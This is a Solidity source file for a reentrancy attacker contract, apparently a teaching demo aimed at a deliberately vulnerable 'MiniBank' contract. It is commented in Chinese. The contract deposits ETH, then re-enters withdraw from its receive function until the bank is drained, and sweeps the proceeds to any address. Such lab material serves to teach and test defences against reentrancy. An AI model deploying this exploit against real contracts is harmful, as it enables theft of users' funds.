// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMiniBankVuln {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IMiniBankVuln public bank;
    uint256 public stepAmount;
    bool public attacking;

    constructor(address bankAddr) {
        bank = IMiniBankVuln(bankAddr);
    }

    /// @notice 让攻击者先把钱存进银行（获得可提余额）
    function seedAndAttack(uint256 _stepAmount) external payable {
        require(msg.value > 0, "need ETH");
        stepAmount = _stepAmount;
        // 先存入
        bank.deposit{value: msg.value}();

        // 开打：从 withdraw 开始，后续靠 receive 重入
        attacking = true;
        bank.withdraw(stepAmount);
        attacking = false;
    }

    receive() external payable {
        // 收到钱时重入
        if (!attacking) return;

        // 只要银行还有钱，就继续掏
        uint256 bankBal = address(bank).balance;
        if (bankBal >= stepAmount) {
            bank.withdraw(stepAmount);
        } else if (bankBal > 0) {
            bank.withdraw(bankBal);
        }
    }

    function sweep(address payable to) external {
        to.transfer(address(this).balance);
    }
}
